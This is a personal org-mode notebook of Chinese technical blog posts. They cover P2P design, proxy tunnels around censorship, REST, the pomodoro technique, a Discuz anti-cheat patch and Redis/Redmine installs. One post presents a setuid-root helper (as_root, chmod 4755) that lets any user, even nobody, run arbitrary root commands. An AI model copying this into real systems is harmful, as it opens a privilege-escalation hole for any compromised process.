   所有结点拥有的资源需要在资源服务器上呈现。

   - 资源标识符 :: 如文件内容的sha1
   - 资源组织，满足以下需求：
     - 根据资源id查找拥有该资源的一批活跃结点，支持各种查找条件（按：同运营商、随机取、按地理位置）
     - 更新结点id拥有的资源
     
     #+begin_src artist
       +-------------------+
       | p2p://example.com |
       +---------+---------+
                 |            +------------------------------------------+
                 +------------+ 1111111111111111111111111111111111111111 |
                 |            +----------------------+-------------------+
                 |                                   |   +-------+
                 |                                   +---+ user1 |
                 |                                   |   +-------+
                 |                                   |           
                 |                                   |   +-------+
                 |                                   +---+ user2 |
                 |                                   |   +-------+
                 |                                   |           
     #+end_src

** 实施
   |------------+--------------------------------------------------------------------+--------|
   | 组件       | 功能                                                               | 人／月 |
   |------------+--------------------------------------------------------------------+--------|
   | 穿透服务器 | 协助客户端进行穿透的外网服务器                                     | 2/0.5  |
   |------------+--------------------------------------------------------------------+--------|
   | 状态服务器 | 与所有客户端保持连接，记录客户端的上下线状态及属性、转发反连指令   | 3/1    |
   |------------+--------------------------------------------------------------------+--------|
   | 资源服务器 | 索引所有资源，根据各种策略为客户端查找拥有该资源的其它客户端信息， | 5/3    |
   |            | 客户端存储的资源变动时，更新资源对应的客户端列表                   |        |
   |------------+--------------------------------------------------------------------+--------|

** 协议
   #+begin_src ditaa :file ../static/p2p_protocol.png :cmdline -r -S -s 3

















   #+end_src
* DONE 《理解Node.js》培训课件                                         :node:
  CLOSED: [2013-07-04 四 18:31]
  
  本课件介绍Node.js的特点及其初步使用。

** 开发计划 [1/3]
   - [X] 编写大纲
   - [ ] 编写内容
   - [ ] 制作Microsoft PowerPoint格式文档

** 在线演示
   [[http://blog.kankanan.com/slides/理解Node.js.html][《理解Node.js》]]

* DONE Archlinux下解决更新grub后无法进入gnome3桌面的问题          :archlinux:
  CLOSED: [2013-06-26 Wed 10:07]
  
  在启动界面上会看到以下错误日志：
  #+begin_example
  kernel: [    8.398186] [drm:radeon_init] *ERROR* No UMS support in radeon module!
  #+end_example

  这个是由于grub配置文件中指定了内核参数 =nomodeset= 导致，linux的默认配置是为了运行服务器，以减少启动过程中出错的可能性，使用gnome3桌面时，需去掉内核参数 =nomodeset= ，以下为[[https://wiki.archlinux.org/index.php/ATI#Disable_KMS][原文]]：

  #+begin_example
    Note: Adding nomodeset to the kernel boot line might prevent GNOME 3's gnome-shell or KDE's desktop effects from running.
  #+end_example

* DONE linux下翻墙访问bitbucket.org仓库                  :linux:hg:bitbucket:
  CLOSED: [2013-06-28 Fri 13:57]
  
  今天往 bitbucket.org push 时才发现 bitbucket 被 GFW 了。我的仓库为 Mercurial hg，hg 项目根目录下的 =.hg/hgrc= 配置文件中可指定 http_proxy，试了一下不支持 socks 代理（我的浏览器用它来翻墙），最终使用 tsocks 或 proxychains 实现翻墙访问 bitbucket.org 仓库。

** 使用 ssh 服务代理网络访问

   创建本地 socks 代理的脚本 =ssh_proxy.sh=
   #+begin_src sh
     #!/bin/bash

     n=`ps waux | grep 'bash .*/ssh_proxy.sh' | grep -v grep | wc -l`
     if [ $n -lt 3 ]; then
         while [ true ]; do
             n=`ps aux | grep 'ssh' | grep '7070' | grep -v grep | wc -l`
             if [ $n -lt 1 ]; then
                 echo "start ssh connecting"
                 ssh -qTnNf -D 7070 user@host
             fi
             echo "wait for next checking"
             sleep 30
         done
     fi
     echo "ssh_proxy.sh already running"
   #+end_src

   请将 user@host 改为你的 vps 用户及主机，并配置为免输入密码。
    
   启动 socks 代理脚本
    
   #+begin_src sh
     nohup bash ./ssh_proxy.sh &
   #+end_src

   通过 ssh 隧道是最简单的方式，vps 一般都会开 ssh 服务，拿来即用。

** 使用 shadowsocks 服务代理网络访问

   vps 上安装并启动 shadowsocks 服务器（ss-server），配置文件 =/etc/shadowsocks.json= 内容如下
   #+begin_src json
     {
       "server":"0.0.0.0",
       "server_port":8989,
       "password":"7FdiirqD",
       "timeout":600,
       "method":"aes-256-cfb",
       "fast_open": false,
       "workers": 1
     }
   #+end_src

   =password= 请自行进行修改。

   pc 上安装并启动 shadowsocks 客户端（ss-local），配置文件 =/etc/shadowsocks.json= 内容如下
   #+begin_src json
     {
       "server":"X.X.X.X",
       "server_port":8989,
       "local_port":7070,
       "password":"7FdiirqD",
       "timeout":600,
       "method":"aes-256-cfb",
       "fast_open": false,
       "workers": 1
     }
   #+end_src

   =server= 请自行修改为真正的 shadowsocks 服务器外网 IP。

** 透明代理

   firefox 可以配置为通过 socks 代理联网，但绝大多数应用是不支持的，而透明代理（Transparent Proxy）可以使这些应用也使用代理联网。

*** ss-redir

    shadowsocks 自带的本地透明代理客户端，可以使整个系统都使用代理访问网络。

    参考 [[http://manpages.org/ss-redir][man ss-redir (1): shadowsocks client as transparent proxy, libev port]]
   
*** tsocks
   
    - 安装

      #+begin_src sh
        yaourt -S tsocks
      #+end_src

    - 配置

      =/etc/tsocks.conf=
      #+begin_example
        # We can access 192.168.0.* directly
        local = 192.168.0.0/255.255.255.0
        local = 10.0.0.0/255.0.0.0

        # Otherwise we use the server
        server = 127.0.0.1
        server_port = 7070
      #+end_example

      具体用法 =man tsocks.conf=

    - 使用
      
      让 hg 用上 socks 代理功能
    
      #+begin_src sh
        tsocks hg push
      #+end_src

      tsocks 看起来很通用，应该也可以让 git 等进行 socks 代理访问。
    
*** proxychains

    tsocks 不支持代理访问 https
   
    #+begin_example
      $ tsocks curl https://www.baidu.com
      curl: (7) Failed to connect to www.baidu.com port 443: Connection refused
    #+end_example

    proxychains 支持代理访问 https
   
    #+begin_example
      $ proxychains curl https://www.baidu.com
      [proxychains] config file found: /etc/proxychains.conf
      [proxychains] preloading /usr/lib/libproxychains4.so
      [proxychains] DLL init: proxychains-ng 4.11
      [proxychains] Dynamic chain  ...  127.0.0.1:7070  ...  www.baidu.com:443  ...  OK
      <html>
      <head>
          <script>
              location.replace(location.href.replace("https://","http://"));
          </script>
      </head>
      <body>
          <noscript><meta http-equiv="refresh" content="0;url=http://www.baidu.com/"></noscript>
      </body>
      </html>
    #+end_example

    proxychains 的安装配置请参考：[[https://sites.google.com/a/pickdreams.org/snail-library/Home/yong-tsocks-heproxychains-dai-lilinux-xia-suo-you-ruan-jian][用tsocks和proxychains代理Linux下所有软件 - 蜗牛图书馆]]

* TODO 《架构风格与基于网络的软件架构设计》读书笔记            :REST:reading:
  
  #+begin_quote
  架构设计的目标是创建一个包含一组架构属性的架构，这些架构属性形成了系统需求的一个超集。不同架构属性的相对重要性取决于想要得到的系统本身的特性。
  #+end_quote

  我们对架构的学习和使用应该更明智一些，通过学习能够做到对一种架构的相关特性（包括优点及缺点）了然于胸，同时在使用的时候能够摆脱潮流及个人主观喜好的影响，选择正确的架构，这样才能获得架构所带来的质量保证，我们才能够对在此基础上构建的系统充满信心。

  
  #+begin_quote
  一种架构风格是一组协作的架构约束，这些约束限制了架构元素的角色和功能，以及在任何一个遵循该风格的架构中允许存在的元素之间的关系。
  #+end_quote

  #+begin_quote
  一个好的设计师应该选择一种与正在解决的特定问题最为匹配的风格。为一个基于网络的应用选择正确的架构风格必须要理解该问题领域，因此需要了解应用的通信需求，知道不同的架构风格和它们所导致的特殊问题，并且有能力根据基于网络的通信的特性来预测每种交互风格的敏感度。
  #+end_quote

* TODO 理解REST [0/3]                                                  :REST:

  - [ ] REST介绍

    REST（Representational State Transfer，表述性状态转移）, 是一种针对网络应用的设计和开发方式，可以降低开发的复杂性，提高系统的可伸缩性。
    
    REST 指的是一组架构约束条件和原则，满足这些约束条件和原则的应用程序或设计就是RESTful。RESTful的Web应用可以获得接口统一、结构优良以及充分使用HTTP协议的好处。

    REST 是Web的架构风格，HTTP 1.1规范的指导原理。

    #+begin_src ditaa :file ./rest_arch.png :cmdline -S -E -s 1.5
              +------------+
              | cBLU       |
              | Hypermedia |         --=--> 三级：超媒体做为应用状态的引擎
              |            |
          +---+------------+---+
          | c0FF               |
          |        HTTP        |     --=--> 二级：使用多个HTTP方法来操作（CRUD）资源
          |                    |
      +---+--------------------+---+
      |  cGRE                      |
      |            URI             | --=--> 一级：使用很多URI暴露很多资源 
      |                            |
      +----------------------------+
      
                                  
                               WEB服务成熟度模型
    #+end_src

    资源由URI标识，资源与URI为一对多关系。

    对资源的操作由HTTP方法对应（Create(POST)、Update(PUT)、Read(GET)、Delete(DELETE)）。
    
    客户端与服务器通过交换资源表述驱动应用状态变迁。

  
  - [ ] REST实现

    REST
    
  - [ ] REST应用

* TODO 实现RESTful Web服务                                             :REST:

** 环节

   - 找出资源
   - 找出服务接口

* DONE 使用番茄工作法的感受                                        :pomodoro:
  CLOSED: [2013-07-08 一 13:10]

** 基本要领
   
   从事务清单中选出今天要做的事

   按优先级填入今日工作计划表

   从表中选择第一项未完成事务按下计时器

   专心做这件事

   25钟后铃响立即停止做事

   在当前事务后标记用掉了一个番茄

   事务完成则在今日事务清单划掉当前任务

   专心休息地5分钟（每4个周期长休息15-30分钟）

   按下计时器

   继续做事

   如此往复

** 掌控干扰因素

   - 做事时如遇实发事件酌情处理：

     - 添加到事务清单中明天再处理
     - 直接安排到今日事务清单稍后处理
     - 立即取消当前事务开始处理突发事件

   - 在当前事务后方打个中断标记

** 解读工作记录

   一天结束后我们将获得以下信息：

     - 知道处理某个事务用时多少。怎样让时间用得更少？

     - 知道时间花在哪里去了。能否将时间更多花在有效处理工作上？

   当新的一天开始时，我们会清楚地知道每天有多少个番茄可用，今天可以安排多少事务，每个事务需要消耗多少个番茄。

   随着我们不断地根据这些记录改进我们的工作效率，最终我们能够安排时间、掌控时间。

** 番茄工作法遵从习惯法则

   当我跟老婆解释番茄工作法时，她说了句：“这个和你之前说的习惯法则很像”，细细一想不无道理。

   习惯的形成的三个步骤：暗示、惯常行为、奖赏。以及习惯回路。

   番茄工作法也有这三个要素：

   　　暗示　　　　　　按下计时器

   　　惯常行为　　　　处理事务

   　　奖赏　　　　　　清脆的铃响、标记番茄的成就感、休息时间的放松

   而习惯回路的形成也容易发现，每天一早来到公司，谁不渴望今天能够过得充满成就感、休息时能够毫无顾忌呢。

   遵从习惯法则的方法论才会更容易展开并长久地坚持下去。

** 参考资料
   [[http://www.pomodorotechnique.com/download/pdf/ThePomodoroTechnique-CHN_v1-3.pdf][《番茄工作法》]]
   [[http://baike.baidu.com/view/5259318.htm][番茄工作法_百度百科]]
   [[http://pomodoro.kankanan.com][番茄工作法在线服务]]

* TODO 番茄园                                                      :pomodoro:
  
  番茄园是一个在线的番茄工作法实施环境。

** 用例
   
   - 添加任务
   
   - 开启番茄钟

   - 取消番茄钟

   - 任务上记录完成的番茄数
    
   - 任务上记录中断的番茄数

** 模型

   #+Caption: 用户
   |-------------------------+------------|
   | 字段                    | 意义       |
   |-------------------------+------------|
   | id                      | 用户标识符 |
   | profile.provider        | 身份提供者 |
   | profile.identifier      | 身份标识符 |
   | profile.name            | 用户名称   |
   | profile.email           | 用户邮箱   |
   | preferences.tick.volume | 嘀嗒声音量 |
   |-------------------------+------------|

   #+Caption: 任务
   |-----------+--------------------|
   | 字段      | 意义               |
   |-----------+--------------------|
   | id        | 任务标识符         |
   | parent    | 主任务标识符       |
   | name      | 名称               |
   | priority  | 优先级             |
   | pomodoros | 关联的番茄标识列表 |
   | user      | 所属用户           |
   |-----------+--------------------|

   #+Caption: 番茄
   |--------+------------|
   | 字段   | 意义       |
   |--------+------------|
   | id     | 番茄标识符 |
   | begin  | 起始时间   |
   | end    | 结束时间   |
   | length | 持续时长   |
   | task   | 所属的任务 |
   |--------+------------|

   #+Caption: 日程
   |--------+----------|
   | 字段   | 意义     |
   |--------+----------|
   | id     | 事件标识符 |
   | start  | 起始时间 |
   | end    | 结束时间 |
   | allDay | 是否全天 |
   | title  | 事件名称   |
   | user   | 所属用户 |
   |--------+----------|

   - 番茄状态
     
     已完成：结束时间 - 起始时间 >= 持续时间
     已取消：结束时间 - 起始时间 < 持续时间
     进行中：其它

** 界面

   #+begin_src ditaa :file ../static/pomodoro_ui.png :cmdline -r -S -s 3
     +---------------------------------------------------------------------+
     |                   +-------+                                         | 
     |                   | timer | stop                                    | 
     |                   +-------+                                         | 
     |                                                                     | 
     |        +------------------------------+                             | 
     |        |                              | add                         | 
     |        +------------------------------+                             | 
     |                                                                     | 
     |        +------------------------------------+                       | 
     |        |   task 1             xxx           | delete start up down  | 
     |        +------------------------------------+                       | 
     |        |   task 2             xx            | delete start up down  | 
     |        +------------------------------------+                       | 
     |        |   task 3                           | delete start up down  | 
     |        +------------------------------------+                       | 
     |        |               ...                  |                       | 
     |        +------------------------------------+                       | 
     +---------------------------------------------------------------------+
   #+end_src

** URL接口
   
   工作：/users/:user_id/works/:work_date/
   任务：                                 tasks/:task_id/
   番茄：                                                pomodoros/:pomodoro_id

* TODO 图解linux启动过程                                              :linux:

  #+begin_src ditaa :file ../static/linux_boot.png :cmdline -r -S -s 3
    +------------+
    |  power on  |
    +------------+
          
            +-----------+
            | load bios |
            +-----------+
                                                              
                                                                                                
                                                              
                      boot device
                               
                            MBR 
                               
                               PRE-BOOT    PARTITION TABLE
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
  #+end_src

* TODO git-svn搭配sshfs实现远程代码编辑及代码管理             :git:svn:linux:

  公司使用内网中统一的svn服务器进行集中式的代码管理，项目的测试环境布署在内网中的虚拟机集群上。

  因为测试环境上的代码树是由多个开发人员同时访问的，因此布署的是从svn中export出来的代码。有的人通过“本地修改副本->上传副本到测试机->测试通过->提交本地副本”方式工作，有的人通过“直接远程修改测试机代码->测试通过->拉回本地->提交代码”。无论是哪种方式都有代码覆盖的风险、以及遗漏提交代码的风险。

  

** 解决的问题   

* DONE node.js下访问mysql注意事项                                :node:mysql:
  CLOSED: [2013-10-11 五 10:45]
  
  本文仅针对 [[https://github.com/felixge/node-mysql][node-mysql]] 模块。

  - Connection 对象为一个到mysql的连接，在其上的query是串行进行的。

    由于mysql协议类似http是串行的，在一个mysql连接上的多个query必须依次进行。
    
    [[https://github.com/felixge/node-mysql][node-mysql]] 的 Connection对象上同时发起的多个query会队列化，
    
    处理完一个query再进行下一query的处理，传递给回调函数的query结果不会错乱。

    在有一定访问量的服务中应该总是使用 =连接池= 。

    
  - 处理Connection对象的重连。

    mysql连接空闲一段时间后（默认8小时）会自动关闭，
  
    可以在Connection对象的 =error= 事件中检测后连接断开时进行重连。

    使用 =连接池= 不会有问题，连接断开后会默认从连接池中剔除。

* DONE 为什么不能在构造函数中调用shared_from_this                       :cpp:
  CLOSED: [2013-12-20 Fri 01:02]

  先看示例代码：

  #+begin_src c++
    class Chicken : public enable_shared_from_this<Chicken>
    {
    public:
        Chicken()
        {
            shared_ptr<Chicken> chicken_ptr = shared_from_this();    //throw std::bad_weak_ptr
        }
    };
  #+end_src

  再看shared_from_this()的行为：
  #+begin_src c++
    return _weak_ptr->lock();
  #+end_src

  =_weak_ptr= 为父类（ =enable_shared_from_this= <Chicken>）的成员变量，需要一个 =shared_ptr= <Chicken>对象来初始化它，而 =shared_ptr= <Chicken>需要一个Chicken对象来创建，但此时Chicken对象正在构造中，这是个鸡与蛋的无解问题。
  
  其实 =_weak_ptr= 成员变量是在 =shared_ptr= 的构造函数中延迟初始化的，不只是在构造函数中不能调用 =shared_from_this= ，像下面的使用方式同样不行：
  #+begin_src c++
    Chicken* chicken = new Chicken();
    shared_ptr<Chicken> chicken_ptr = chicken->shared_from_this();  //throw std::bad_weak_ptr
  #+end_src
  
  =enable_shared_from_this= 不是从this祼指针变出智能指针的魔法，它只是一个辅助类，为一个只使用 =shared_ptr= 管理对象生命周期的类添加一个自身的智能指针成员变量供内部使用。

  而“不能在构造函数中调用 =shared_from_this= ”这个问题仅仅是标准实现上的一个漏洞。

  你应该像下面这样用：
  #+begin_src c++
    class Chicken : public enable_shared_from_this<Chicken>
    {
    public:
        Chicken()
        {
        }
    
        void use()
        {
            shared_ptr<Chicken> chicken_ptr = shared_from_this();
        }
    };
    
    shared_ptr<Chicken> chicken_ptr(new Chicken);
    chicken_ptr->use();
  #+end_src

  突然想起一段对话：
  #+begin_quote
  阿漆：闻西，事情进行的怎么样了，闻西？

  达闻西： 最近我发明了些东西，相信能帮得到你。

  达闻西拿出手电筒。

  阿漆：手电筒？

  达闻西：错，这支不是一只普通的手电筒，这支是一支不需要电池的太阳能手电筒，在有光的时候他就会亮。

  司令：那如果没有光呢？

  达闻西：绝对不亮。

  阿漆：有没有可能没光的时候它也会亮？

  达闻西：问的好，关灯。

  达闻西：你拿另一只手电筒照它呢，它就会亮。

  达闻西：哈哈，怎么样啊？

  阿漆：这个发明还真有创意啊。
  #+end_quote



  参考：《[[http://hi.baidu.com/cpuramdisk/item/7c2f8d77385e0f29d7a89cf0][shared_from_this 几个值得注意的地方]]》

* DONE Discuz访问推广任务反作弊                                  :php:discuz:
  CLOSED: [2013-12-20 Fri 01:02]

  - 识别作弊

    发贴、回复较少的用户具有偏高的积分、等级通常就是潜在的作弊对象。在后台查看该用户的积分历史，如果来历不明，那么很可能是通过访问推广作弊获得的。

    在我们的例子里就发现有一个用户金钱数过高，先查看该用户的积分表：

    #+begin_example
      mysql> SELECT total, cyclenum, extcredits2 FROM g_common_credit_rule_log WHERE rid=8 and uid=119;
      +-------+----------+-------------+
      | total | cyclenum | extcredits2 |
      +-------+----------+-------------+
      |  3454 |     3454 |           1 |
      +-------+----------+-------------+
      1 row in set (0.00 sec)
    #+end_example
    
    相关字段说明
      - total :: 策略被执行总次数
      - cyclenum :: 周期被执行次数 
      - extcredits2 :: 我们的系统里对应金钱数
      - rid :: 值8为访问推广任务类型
      - uid :: 值119为作弊用户id

    从上面可以看出该用户完成了3454次任务， 接下来就需要确认这些任务是通过作弊完成的了。
    
    搜索该用户推广链接在web服务器中留下的访问日志：
    #+begin_example
      logs# grep 'fromuid=119' /usr/local/nginx/logs/access.log*
      "GET /?fromuid=119.jpg HTTP/1.1" 301 6243 "http://xxxx.org/details.php?id=178668"
      ...
    #+end_example

    可以初步断定，该用户通过在其它论坛中发布信息并将推广url注入到图片的url中，这样我们的站点在访问量没有任何增长的情况下该用户的推广数却瞬间彪升了。

  - 阻止作弊

    通过使用引用页中的用户标识进行记录来解决这个问题，这样只有当用户来到论坛并进行了相关操作才算推荐有效。

    修改source/class/discuz/discuz_application.php文件，将下面的内容：
    #+begin_src php
      if((!empty($_GET['fromuid']) || !empty($_GET['fromuser'])) && ($this->var['setting']['creditspolicy']['promotion_visit'] || $this->var['setting']['creditspolicy']['promotion_register'])) {
          require_once libfile('misc/promotion', 'include');
      }
    #+end_src
    改为：
    #+begin_src php
      if (isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'http://XXX.com/') === 0) {
          $referer_query = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_QUERY);
          if ($referer_query) {
              parse_str($referer_query, $referer_get);
              if((!empty($referer_get['fromuid']) || !empty($referer_get['fromuser'])) && ($this->var['setting']['creditspolicy']['promotion_visit'] || $this->var['setting']['creditspolicy']['promotion_register'])) {
                  require_once libfile('misc/promotion', 'include');
              }
          }
      }
    #+end_src

    修改source/include/misc/misc_promotion.php文件，将下面的内容：
    #+begin_src php
      if(!empty($_GET['fromuid'])) {
          $fromuid = intval($_GET['fromuid']);
          $fromuser = '';
      } else {
          $fromuser = $_GET['fromuser'];
          $fromuid = '';
      }
    #+end_src
    改为：
    #+begin_src php
      if(!empty($referer_get['fromuid'])) {
          $fromuid = intval($referer_get['fromuid']);
          $fromuser = '';
      } else {
          $fromuser = $referer_get['fromuser'];
          $fromuid = '';
      }
    #+end_src

* DONE linux下允许普通用户执行需要root权限的命令                    :linux:c:
   CLOSED: [2013-12-26 四 15:44]

   最典型的情况是要实现一个通过web界面重启系统的功能，通常为了安全会以非root用户身份（通常是nobody）运行服务端脚本，这样脚本中就不能执行危险操作了。

   下面的c工具程序可以允许任意用户执行需要root权限的命令：

   [[file:../static/as_root.c][as_root.c]]

   编译：
   #+begin_src sh
     gcc -g as_root.c -o as_root
   #+end_src

   配置：
   #+begin_src sh
     chown root:root ./as_root; chmod 4755 ./as_root
   #+end_src

   运行：
   #+begin_src sh
     sudo -u "nobody" ./as_root "reboot"
   #+end_src
   
   参考：[[http://blog.tianya.cn/blogger/post_show.asp?BlogID=126326&PostID=1629441][如何在普通用户下执行一些需要root用户执行的命令]]

* DONE express.js中如何在第一次请求的响应中取得connect.sid             :node:
  CLOSED: [2014-02-14 Fri 23:34]

  在web页面通过iframe跨域登录访问服务的情况下，是不方便取cookie中的sessionid的，于是想到将sessionid直接放到响应体中，
  这就需要在node.js中直接获取connect.sid这个cookie值，一开始想当然地以为系统（使用的是passport.js）会在登录认证通过后
  执行res.cookie('connect.sid', ...)进行设置，就想直接从res的Set-Cookie头解析出设置的值，结果发现这个cookie压根不存在，
  甚至在库代码中搜索cookie都不管用，着实急得人直抓头。最后dump出res后确在req中见到了connect.sid值的影子：req.sessionID，
  然后在 [[http://stackoverflow.com/questions/13693101/express-sessionid-differs-from-sessionid-in-cookie][《Express SessionID differs from SessionID in Cookie》]] 中找到了从req.sessionID计算出connect.sid的方法：

  #+begin_src js
    var signature = require('express/node_modules/cookie-signature');
    var connectSid = 's:' + signature.sign(req.sessionID, sessionOptions.secret);
  #+end_src

  其实，connect.sid这个cookie是在请求到来后在req上设置的（不存在则设置），不管有没有登录都会设置。

* TODO 安装archlinux实录                                          :archlinux:

  - 机器型号

  - 首先按照 [[https://bbs.archlinuxcn.org/viewtopic.php?id=1037][这篇文章]] 进行安装

  - 因为是直接插网线的，启用网络服务
    
    #+begin_src sh
      systemctl enable dhcpcd.service
    #+end_src

  - 安装完成重启后出现“device not found”的错误，并提示指定uuid的分区不存在
    
    在archlinux启动项上按c进入命令行，记下/boot分区（这里是hda0,msdos1）的uuid，再次重启机器，在archlinux启动项上按e，将里面的uuid值替换为之前记下来的正确的uuid，
    按F10后应该可以正常启动了，使用root帐号登录后，再次执行“grub-mkconfig -o /boot/grub/grub.cfg”出现out of memory及其它错误（很可能在参考前一篇文章执行时就有这个错误，只是被忽视了），
    参考 [[https://bbs.archlinux.org/viewtopic.php?id=173921][这篇文章]] 在/etc/default/grub.cfg中追加下面一行内容：
    #+begin_example
    GRUB_DISABLE_SUBMENU=y
    #+end_example
    再次生成grub.cfg，就好了。
    
* DONE 编译安装node.js                                                 :node:
  CLOSED: [2014-02-17 Mon 16:23]
  
  - 下载

    node.js是一个新兴的开发平台，版本更新非常活跃，因此应该尽量下载安装最新的版本。

    到 [[http://nodejs.org/]] 下载最新的版本。

  - 安装
  
    解压后参照 README.md 进行安装：

    #+begin_src sh
      ./configure
      make
      make install
    #+end_src
  
  - 安装后
    
    默认安装到/usr/local。

    + /usr/local/bin/node :: node主程序
    + /usr/local/bin/npm :: node模块管理程序
    + /usr/local/lib/node_modules :: node全局模块目录

    像一些需要全局安装的模块也会把文件安装在/usr/local目录下。
    
* DONE 编译安装redis                                                  :redis:
  CLOSED: [2014-02-17 Mon 16:40]
  
  - 下载
    
    到 [[http://redis.io/download]] 下载最新稳定版本。

  - 安装
  
    解压后参照 README 进行安装：

    #+begin_src sh
      make
      make install
    #+end_src

    默认安装到/usr/local。

    指定位置安装： 

    #+begin_src sh
      make PREFIX=/usr/local/redis install
    #+end_src

  - 安装后
    
    + /usr/local/bin/redis-cli :: redis客户端程序 
    + /usr/local/bin/redis-server :: redis服务器程序

  - 配置

    将源码包附带的配置文件 =redis.conf= 拷贝到安装位置:

    #+begin_src sh
      mkdir /usr/local/redis/etc/
      cp ./redis.conf /usr/local/redis/etc/
    #+end_src

    修改配置文件 =redis.conf= :

    #+begin_example
      daemonize yes
      pidfile /usr/local/redis/var/redis.pid
      logfile /usr/local/redis/var/redis.log
      dir /usr/local/redis/data
      stop-writes-on-bgsave-error no
      bind 127.0.0.1
    #+end_example

  - 启动

    #+begin_src sh
      /usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.conf
    #+end_src

  - 停止

    使用redis客户端中执行shutdown命令

    #+begin_src sh
      redis-cli
      shutdown
    #+end_src

* TODO 当心烦意乱接下来不知道要做什么的时候                            :心理:

  - 试着通过深呼吸、走一走、微笑让自已平静下来，回归理性的自已。
    
  - 使用待办事项记录，一定要细致到可以直接采取行动，不用等到有好心情才能做成一些事情。
* TODO 迅雷路由水晶版内测资格申请页面上线的故事                       :story:

  - 先看看注册页面的svn日志吧:)

    #+begin_example
      ------------------------------------------------------------------------
      r922 | tangxinfa | 2014-03-03 18:21:31 +0800 (Mon, 03 Mar 2014) | 4 lines
      
      修复discuz进行xss检查导致的用户申请丢失的bug。
      
      ------------------------------------------------------------------------
      r744 | tangxinfa | 2014-02-24 13:04:47 +0800 (Mon, 24 Feb 2014) | 3 lines
      
      申请表单去除”身份证号码“字段。
      ”市、县级市“改为非必填（在选“广东省”，“中山市”时出现）。
      
      ------------------------------------------------------------------------
      r740 | tangxinfa | 2014-02-22 19:36:03 +0800 (Sat, 22 Feb 2014) | 4 lines
      
      身份证号 手机号码 邮箱 QQ号码 申请理由不得重复.
      修复缓存导致的登录跳转死循环bug.
      图片引用绝对路径以支持正式环境上的url重写.
      
      ------------------------------------------------------------------------
      r721 | tangxinfa | 2014-02-22 16:24:12 +0800 (Sat, 22 Feb 2014) | 3 lines
      
      兼容ie6.
      修复缓存相关bug.
      
      ------------------------------------------------------------------------
      r704 | tangxinfa | 2014-02-22 00:02:59 +0800 (Sat, 22 Feb 2014) | 1 line
    #+end_example

  - r704 :: 周五晚上，刚过12点，哥哼着小曲，心满意足的提交了代码（再三要求不许再改设计图之后，终于调好了）。同事：very good，看来明天我可以不用来加班了，有事给我电话。
  
  - r721 r740 :: 上午快11点才到的公司，看来今天收收尾就就能早点回家了。

            + 打算就错误处理这一块进行了完善 :: 提交数据时检查下字段是否有重复值，有重复值还要给用户提示错误。
   
              懒得一个一个字段的地判断重复了，数据库结构一改：不能重复定义为UNIQUE就是了，插入记录出错时如果错误码表明因重复的字段值引起则从错误描述中匹配出字段名，
  
              然后返回给客户端进行提示即可。天衣无缝啊，几年前就想这么干了，总算得手了。


            + 同事反映了一个问题 :: ”市、县级市“中有重复项
  
              一查还真是有，网上找的东东问题多啊，直接给js地址库加了个检测重复值的方法，控制台打印出重复项的位置，好多重复的“城关镇”啊，删掉重复项，收工。

            + 有热心网友反馈ie6/ie7下的兼容性问题

              这个问题必须有，压根没想到要给页面做ie6/ie7兼容，哥没空啊，忙得都忘了还有用ie6/ie7的人了。不过思来想去还是得改啊，开门做生意哪能拒人于千里之外呢，更何况这网友能耐大着呢，看图：

              [[file:../static/ie6bugfix1.png]]

              [[file:../static/ie6bugfix2.png]]

              见过给我提意见的，没见过直接列出解决方案的，做前端肯定比我专业。

            + 在测试环境上跑了一遍上线，整理了一下要点，就叫它《20140224-水晶版内测上线指南》吧，等周一过来切下主页就完事了，晚上8点哼着小曲瘪着肚子回家。

  - r744 :: 早上9:20就到公司，10点准时上线申请页面。才半个小时就有1000多人注册，比我想像的多多了。

            + 同事反映有部分网友登记时不愿提供身份证号码，去掉这一项话更友好

              那就改吧。一条SQL语句“ALTER TABLE `XXXXXX` CHANGE `idnumber` `idnumber` char(32) NOT NULL DEFAULT ''”去掉必填限制，html表单中去掉该字段，测了一下没问题立即上线。

            + 5分钟后，论坛、微博有不少网友反映点提交按钮没反映，同事那里也重现了，原来改数据库字段定义时UNIQUE属性不会自动删除，Google了一下，再来一条SQL语句“ALTER TABLE `g_custom_open` DROP INDEX idnumber;”。

            + 有网友反映，收货地址选“广东省”，“中山市”后，”县级市“下拉空就空了，现在又必填才能提交

              修改html表单校验js，去掉必填限制。

  - r922 :: 同事给出了选中进行内测的用户id列表，结果在申请数据表中竟然没有申请记录，一开始怀疑是用户有多个迅雷帐号，可能使用的是其它帐号提交的申请，不过很快排除了这种可能，查了一下RTX记录，申请的用户数也一直正常在增长，
            
            于是在错误处理进行得更严格了一些，很快用户反映提交出错，在用户的协助下从服务器抓包后发现提交申请的响应竟然是一个html页面：您当前的访问请求当中含有非法字符，已经被系统拒绝。
            
            原来，discuz默认情况下会对用户的输入进行检查如果其中包含像"><'()这些符号则会认为是xss攻击，阻止提交。最终通过在这个请求中临时禁用xss检测，解决了这个问题。

            但是粗略估计有1/7的申请丢失，好在挑选内测用户是在论坛所有用户中选取后再获取他们的申请信息，不影响申请结果。

  - 结语

    + 再简单的页面也能养活一堆虫子

    + 一定要有专业的测试人员来把测试关

    + 群众的眼睛是雪亮的

    + 要使用严格的错误检测
* TODO 选择基于Web的项目管理工具                                   :web:tool:

  - [[http://collabtive.o-dyn.de/index.php][Collabtive]] 使用php开发，可自行安装。界面效果非常棒，中文界面。项目管理及帐号管理也很不错。但功能单一，只支持任务跟踪。

  - [[http://trac.edgewall.org/][Trac]] 使用python开发，可自行安装。界面一般，中文支持较差。项目管理及帐号管理很差。功能较丰富，支持Wiki、任务及Bug跟踪。

  - [[https://trello.com][trello]] 使用node.js开发，不可自行安装。界百效果超棒，不支持中文。项目管理及帐号管理很棒。功能单一，只支持任务跟踪，注重团队交流。

* DONE CentOS 6.4下安装redmine                                :linux:redmine:
  CLOSED: [2014-03-07 Fri 14:17]

  本文为CentOS 6.4下安装redmine-2.5.0的笔记，按照 [[http://www.redmine.org/projects/redmine/wiki/RedmineInstall][官方文档]] 进行安装。

** 安装 =ruby=
    
   #+begin_src sh
     yum install ruby
     yum install ruby-devel
     yum install rubygems
   #+end_src

** 安装 =redmine=
   
   #+begin_src sh
     wget 'http://www.redmine.org/releases/redmine-2.5.0.tar.gz'
     tar xzvf redmine-2.5.0.tar.gz
     gem install bundler
     gem install mysql2.
     yum install ImageMagick ImageMagick-devel
     bundle install --without development test  
   #+end_src

** 配置 =redmine=

   - 以 root 用户登录 =mysql=

